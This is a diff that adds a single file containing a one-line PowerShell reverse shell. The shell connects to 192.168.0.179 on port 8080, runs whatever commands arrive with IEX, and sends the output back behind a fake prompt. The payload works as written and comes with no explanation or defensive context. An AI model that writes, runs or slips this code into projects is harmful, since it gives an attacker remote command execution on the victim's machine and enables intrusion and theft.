@@ -1,0 +1,1 @@
+$c=New-Object System.Net.Sockets.TCPClient('192.168.0.179',8080);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(IEX $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbty=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbty,0,$sbty.Length);$s.Flush()};$c.Close()
